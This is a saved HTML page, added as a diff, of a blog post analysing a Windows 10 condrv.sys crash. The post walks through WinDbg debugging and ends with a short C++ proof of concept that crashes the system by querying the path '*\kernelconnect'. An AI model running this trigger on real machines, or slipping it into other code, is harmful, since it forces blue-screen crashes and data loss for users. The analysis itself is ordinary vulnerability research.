@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<!-- saved from url=(0037)http://lzeroyuee.cn/archives/224.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    <link rel="dns-prefetch" href="https://lib.baomitu.com/">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Win10 ConDrv-BSOD - lZeroyuee's Blog</title>
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="http://lzeroyuee.cn/usr/uploads/2020/05/1330681747.png">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <!-- AmazeUI 3.0 -->
+    <link rel="stylesheet" href="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/amazeui.min.css">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/customui.min.css">
+    <!-- CodeHighlight -->
+    <style>
+    .hljs{display:block;overflow-x:auto;padding:0.5em;color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;}.hljs-doctag,.hljs-keyword,.hljs-formula{color:#a626a4}.hljs-section,.hljs-name,.hljs-selector-tag,.hljs-deletion,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-string,.hljs-regexp,.hljs-addition,.hljs-attribute,.hljs-meta-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-variable,.hljs-template-variable,.hljs-type,.hljs-selector-class,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-number{color:#986801}.hljs-symbol,.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:bold}.hljs-link{text-decoration:underline}
+    </style>
+    <!-- FontAwesome -->
+    <link href="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/font-awesome.min.css" rel="stylesheet">
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="简介在win10中，访问*\kernelconnect时（懂得都懂），会触发BSOD漏洞分析挂上windbg，触发漏洞，会得到以下信息崩溃触发在cond...">
+<meta name="generator" content="Typecho 1.2/19.05.09">
+<meta name="template" content="amaze">
+<link rel="pingback" href="http://lzeroyuee.cn/action/xmlrpc">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://lzeroyuee.cn/action/xmlrpc?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://lzeroyuee.cn/action/xmlrpc?wlw">
+<link rel="alternate" type="application/rss+xml" title="Win10 ConDrv-BSOD » lZeroyuee&#39;s Blog » RSS 2.0" href="http://lzeroyuee.cn/feed/archives/224.html">
+<link rel="alternate" type="application/rdf+xml" title="Win10 ConDrv-BSOD » lZeroyuee&#39;s Blog » RSS 1.0" href="http://lzeroyuee.cn/feed/rss/archives/224.html">
+<link rel="alternate" type="application/atom+xml" title="Win10 ConDrv-BSOD » lZeroyuee&#39;s Blog » ATOM 1.0" href="http://lzeroyuee.cn/feed/atom/archives/224.html">
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-224'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-224'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-224'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _uK1y5 = 'hwy'//'hwy'
++'9ec'//'E'
++/* 'oOC'//'oOC' */''+//'Xx'
+'1'+'7aa'//'7RW'
++''///*'To9'*/'To9'
++'b6'//'Fs'
++//'6'
+'7b'+//'HRO'
+'4'+'Yf2'//'Yf2'
++//'0De'
+'344'+''///*'8l'*/'8l'
++'l2u'//'l2u'
++//'c8'
+'c8'+//'bU5'
+'77'+'ab'//'g'
++//'cYS'
+'d'+//'ccm'
+'38e'+//'HP'
+'17f'+//'TZz'
+'060'+//'V'
+'1'+'1'//'4'
++'f'//'eMv'
+, _yfk = [[0,3],[12,15],[15,18],[15,17]];
+    
+    for (var i = 0; i < _yfk.length; i ++) {
+        _uK1y5 = _uK1y5.substring(0, _yfk[i][0]) + _uK1y5.substring(_yfk[i][1]);
+    }
+
+    return _uK1y5;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" href="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/APlayer.min.css">
+<script type="text/javascript" src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/APlayer.min.js.下载"></script>
+<script>var meting_api="http://lzeroyuee.cn/action/metingapi?server=:server&type=:type&id=:id&auth=:auth&r=:r";</script></head>
+
+<body id="blog">
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="http://lzeroyuee.cn/">lZeroyuee's Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="http://lzeroyuee.cn/">Home</a>
+                    </li>
+                                                            <li>
+                        <a href="http://lzeroyuee.cn/archives.html">归档</a>
+                    </li>
+                                        <li>
+                        <a href="http://lzeroyuee.cn/about-me.html">关于我</a>
+                    </li>
+                                                        </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <header class="intro-header" style="background-image: url(&#39;&#39;)">
+    <div class="container">
+        <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>Win10 ConDrv-BSOD</h1>
+                        <span class="meta">@lzeroyuee &nbsp;January 21, 2021</span>
+                        <div class="tags post-tags"><a href="http://lzeroyuee.cn/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;</div>
+                    </div>
+                </div>
+        </div>
+    </div>
+    </header>
+
+    <!-- content start -->
+    <div class="container">
+    <div class="am-g am-g-fixed blog-fixed">
+        <div class="am-u-lg-12 am-u-sm-12">
+            <article class="am-article blog-article-p article-trigger">
+                <div id="post-content" class="am-article-bd">
+                    <h2 id="directory069569999754988191">简介</h2><p>在win10中，访问<code>*\kernelconnect</code>时，会触发BSOD</p><p><img src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/1302214957.png" alt="1.png" title="1.png"></p><h2 id="directory069569999754988192">漏洞分析</h2><p>挂上windbg，触发漏洞，会得到以下信息</p><p><img src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/1122889149.png" alt="2.png" title="2.png"></p><p>崩溃触发在<code>condrv.sys</code>模块的<code>condrv!CdpDispatchCleanup</code>函数中，触发异常为<code>c0000005</code>内存访问异常，这里是因为访问了地址为0的内存</p><pre><code class="hljs http"><span class="hljs-attribute">BUGCHECK_CODE</span>:  3b
+
+<span class="http"><span class="hljs-attribute">BUGCHECK_P1</span>: c0000005
+
+<span class="http"><span class="hljs-attribute">BUGCHECK_P2</span>: fffff8046aacaf6f
+
+<span class="http"><span class="hljs-attribute">BUGCHECK_P3</span>: ffffbc85eb32e860
+
+<span class="http"><span class="hljs-attribute">BUGCHECK_P4</span>: 0
+
+<span class="makefile"><span class="hljs-section">CONTEXT:  ffffbc85eb32e860 -- (.cxr 0xffffbc85eb32e860)</span>
+rax=ffffc5878d7ddd08 rbx=ffffc58789b66c30 rcx=0000000000000000
+rdx=ffffc5878d7ddbf0 rsi=0000000000000000 rdi=ffffc5878d7ddbf0
+rip=fffff8046aacaf6f rsp=ffffbc85eb32f260 rbp=0000000000000000
+ r8=ffffc5878d7ddbf0  r9=ffffc587842d8e20 r10=fffff8046aacaf50
+r11=0000000000000000 r12=0000000000000000 r13=0000000000000000
+r14=0000000000000000 r15=ffffc587842d8e20
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00050286
+<span class="hljs-section">condrv!CdpDispatchCleanup+0x1f:</span>
+fffff804`6aacaf6f 488b01          mov     rax,qword ptr [rcx] ds:002b:00000000`00000000=????????????????
+Resetting default scope
+
+<span class="hljs-section">PROCESS_NAME:  explorer.exe</span></span></span></span></span></span></code></pre><p>查看调用栈，如下：</p><p><img src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/1765838368.png" alt="3.png" title="3.png"></p><p>定位到<code>condrv!CdpDispatchCleanup</code>函数，可以看到参数<code>a2</code>为<code>IRP *</code>，通过参数<code>a2</code>取得当前IRP栈上的文件对象，再取得该文件对象的<code>FsContext</code>字段给<code>v3</code>，后续在<code>v3</code>解引用时，触发了访问异常</p><p><img src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/3117733515.png" alt="4.png" title="4.png"></p><p>紧接着栈回溯向上找<code>nt!IofCallDriver</code>函数，此函数直接向设备对象发送IRP请求，如下：</p><p><img src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/1373116905.png" alt="5.png" title="5.png"></p><p>接着再网上<code>nt!IopCloseFile</code>，可发现其将传入参数<code>a2</code>设置给文件对象，后续就调用了<code>nt!IofCallDriver</code>，观察发现，此函数内没有对<code>a2-&gt;FsContext</code>字段进行判空检查</p><p><img src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/3291187025.png" alt="6.png" title="6.png"></p><p>此处动态调试一下，在调用栈上可以看到一个<code>kernelbase!GetFileAttributesW</code>函数，</p><p>附加到<code>explorer.exe</code>上，在此函数上下条件断点，过滤第一个参数路径：<code>bp kernelbase!GetFileAttributesW "$$&lt;G:\cmp.txt"</code></p><pre><code class="hljs ruby">$$ <span class="hljs-symbol">G:</span>\cmp.txt
+as /mu ${/<span class="hljs-symbol">v:</span>name} @rcx
+.<span class="hljs-keyword">if</span> ($spat(@<span class="hljs-string">"${name}"</span>, <span class="hljs-string">"*kernelconnect"</span>) == <span class="hljs-number">0</span>) {gc} .<span class="hljs-keyword">else</span> {du rcx}</code></pre><p><img src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/2025578647.png" alt="7.png" title="7.png"></p><p>然后再对<code>nt!IopCloseFile+0x14b</code>下断点，断下后查看<code>rbx</code>的值，这里的rbx对照反汇编源码即为参数<code>a2</code></p><p><img src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/475978582.png" alt="8.png" title="8.png"></p><p>接下来再对<code>condrv!CdpDispatchCleanup+0xe</code>下断点，查看<code>[rax+0x30]</code>的值</p><p><img src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/2315930280.png" alt="9.png" title="9.png"></p><p>结果跟静态分析的一致</p><p>根据调试的结果来看，此漏洞在R3上是由<code>kernelbase!GetFileAttributesW</code>触发，那么理论上讲只要调用了<code>GetFileAttributesW</code>传入<code>*kernelconnect</code>就能触发BSOD，所以写个代码验证下</p><pre><code class="lang-cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
+</span>{
+    WIN32_FILE_ATTRIBUTE_DATA data;
+    GetFileAttributesExW(<span class="hljs-string">L"*\kernelconnect"</span>, GetFileExInfoStandard, &amp;data);
+
+    system(<span class="hljs-string">"pause"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre><p>实验结果来看，确实可以，此漏洞跟浏览器啥的没关系</p><h2 id="directory069569999754988193">补充</h2><p>根据深信服的通报，此漏洞在创建初始化对象时就埋下了隐患，详情：<a href="https://mp.weixin.qq.com/s/QhGYn6wPquSY6obvjgt8VQ">深信服EDR快速响应支持防护Windows condrv.sys内存损坏漏洞</a></p><p><img src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/2685985480.png" alt="10.png" title="10.png"></p>                </div>
+            </article>
+            <!-- <hr>
+            <ul class="pager">
+                <li class="previous"><a href="http://lzeroyuee.cn/archives/213.html" title="CVE-2020-0787分析">CVE-2020-0787分析</a></li>
+                <li class="next"><a href="http://lzeroyuee.cn/archives/225.html" title="Shellcode to UUID">Shellcode to UUID</a></li>
+            </ul> -->
+            <hr>
+        </div>
+
+    </div>
+    </div>
+    
+
+<div id="respond-post-224" class="comment-container">
+    <div id="comments" class="clearfix">
+                        <div id="respond-post-224" class="respond">
+            <div class="cancel-comment-reply">
+            <a id="cancel-comment-reply-link" href="http://lzeroyuee.cn/archives/224.html#respond-post-224" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </div>
+        
+            <h3 id="response">添加新评论</h3>
+            <form method="post" action="http://lzeroyuee.cn/archives/224.html/comment" id="comment-form" role="form">
+                                <div class="am-g">
+                    <span class="am-u-lg-4 comment-input">
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="author" id="author" class="text" value="" required="">
+                    </span>
+                    <span class="am-u-lg-4">
+                        <label for="mail" class="required">Email</label>
+                        <input type="email" name="mail" id="mail" class="text" value="" required="">
+                    </span>
+                    <span class="am-u-lg-4 comment-input">
+                        <label for="url">网站</label>
+                        <input type="url" name="url" id="url" class="text" value="">
+                    </span>
+                </div>
+                                <p>
+                    <label for="textarea" class="required">内容</label>
+                    <textarea rows="8" cols="32" name="text" id="textarea" class="textarea" required=""></textarea>
+                </p>
+                <p>
+                    <button type="submit" class="submit am-btn am-btn-primary">提交评论</button>
+                </p>
+            <input type="hidden" name="_" value="9ec17aab67b434477abd38e17f06011f"></form>
+        </div>
+        
+            </div>
+</div>    <div id="directory-content" class="directory-content initial headroom--top headroom--not-bottom">
+        <div id="directory"><ul><span style="color: rgb(243, 129, 129); font-weight: 600;">目录</span><li><a href="http://lzeroyuee.cn/archives/224.html#directory069569999754988191">简介</a></li><li><a href="http://lzeroyuee.cn/archives/224.html#directory069569999754988192">漏洞分析</a></li><li><a href="http://lzeroyuee.cn/archives/224.html#directory069569999754988193">补充</a></li></ul></div>
+    </div>
+    <!-- content end -->
+
+<footer class="blog-footer">
+    <ul class="list-inline text-center">
+	    <li>
+            <a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
+            <span class="am-icon-btn am-icon-md am-icon-github footer-icon"></span>
+        </a></li><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
+    </a></ul><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
+    </a><div class="blog-text-center"><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">© 2021 </a><a href="http://lzeroyuee.cn/">lZeroyuee's Blog</a> 由 <a href="http://www.typecho.org/" target="_blank">Typecho</a> 强力驱动 Theme is <a href="https://spiritree.me/" target="_blank">Amaze made by Spiritree</a>
+    </div>
+</footer>
+<script src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/jquery.slim.min.js.下载"></script>
+<script src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/highlight.min.js.下载"></script>
+<script>
+    var $body=document.body;var $toggle=document.querySelector(".navbar-toggle");var $navbar=document.querySelector("#huxblog_navbar");var $collapse=document.querySelector(".navbar-collapse");var __HuxNav__={close:function(){$navbar.className=" ";setTimeout(function(){if($navbar.className.indexOf("in")<0){$collapse.style.height="0px"}},400)},open:function(){$collapse.style.height="auto";$navbar.className+=" in"}};$toggle.addEventListener("click",function(a){if($navbar.className.indexOf("in")>0){__HuxNav__.close()}else{__HuxNav__.open()}});document.addEventListener("click",function(a){if(a.target==$toggle){return}if(a.target.className=="icon-bar"){return}__HuxNav__.close()});jQuery(document).ready(function(c){var d=1170;if(c(window).width()>d){var b=c(".navbar-custom").height(),a=c(".intro-header .container").height();c(window).on("scroll",{previousTop:0},function(){var e=c(window).scrollTop(),f=c(".side-catalog");if(e<this.previousTop){if(e>0&&c(".navbar-custom").hasClass("is-fixed")){c(".navbar-custom").addClass("is-visible")}else{c(".navbar-custom").removeClass("is-visible is-fixed")}}else{c(".navbar-custom").removeClass("is-visible");if(e>b&&!c(".navbar-custom").hasClass("is-fixed")){c(".navbar-custom").addClass("is-fixed")}}this.previousTop=e;f.show();if(e>(a+41)){f.addClass("fixed")}else{f.removeClass("fixed")}})}});
+</script>
+<script>
+    $(document).ready(function() {
+        $('pre code').each(function(i, block) {
+            hljs.highlightBlock(block)
+        })
+        $('table').addClass('am-table')
+    })
+</script>
+<script type="text/javascript" src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/Meting.min.js.下载"></script>
+
+<script src="./Win10 ConDrv-BSOD - lZeroyuee&#39;s Blog_files/headroom.min.js.下载"></script>
+<script>
+var postDirectoryBuild=function(){var b=function a(l,h){var k=[],e=typeof h==="object",g=typeof h==="string",j,f,d;for(f=0,d=l.length;f<d;f++){j=l[f];if((j.nodeType===1||j.nodeType===9)&&(!h||e&&h.test(j.tagName.toLowerCase())||g&&j.tagName.toLowerCase()===h)){k.push(j)}}return k},c=function(e,f,r){var n=[],m=[],h,p,d,j,l,s,o,g,k,q;h=(function(i,C,A){var w=b(i.childNodes,/^h\d$/),x=[],v=1,B=1,z=0,D=1,t="directory"+(Math.random()+"").replace(/\D/,""),B,y,u;while(w.length){u=w.shift();C.push(u.innerHTML);y=+u.tagName.match(/\d/)[0];if(y>v){x.push(1);B+=1}else{if(y===B||y>B&&y<=v){x.push(0);B=B}else{if(y<B){x.push(y-B);B=y}}}z+=x[x.length-1];v=y;u.id=u.id||(t+D++);A.push(u.id)}if(z!==0&&x[0]===1){x[0]=0}return x})(e,n,m);j=p=document.createElement("ul");q=document.createElement("span");q.style="color:#F38181;font-weight:600;";q.innerHTML="目录";p.appendChild(q);dirNum=[];for(g=0,k=h.length;g<k;g++){d=h[g];if(d===1){l=document.createElement("ul");if(!j.lastElementChild){j.appendChild(document.createElement("li"))}j.lastElementChild.appendChild(l);j=l;dirNum.push(0)}else{if(d<0){d*=2;while(d++){if(d%2){dirNum.pop()}j=j.parentNode}}}dirNum[dirNum.length-1]++;s=document.createElement("li");o=document.createElement("a");o.href="#"+m[g];o.innerHTML=!r?n[g]:dirNum.join(".")+" "+n[g];s.appendChild(o);j.appendChild(s)}f.appendChild(p)};c(document.getElementById("post-content"),document.getElementById("directory"),false)};postDirectoryBuild();
+</script>
+<script>
+    var postDirectory = new Headroom(document.getElementById("directory-content"), {
+    tolerance: 5,
+    offset: 240,
+    classes: {
+        initial: "initial",
+        pinned: "pinned",
+        unpinned: "unpinned"
+    }
+});
+postDirectory.init();
+</script></body></html>
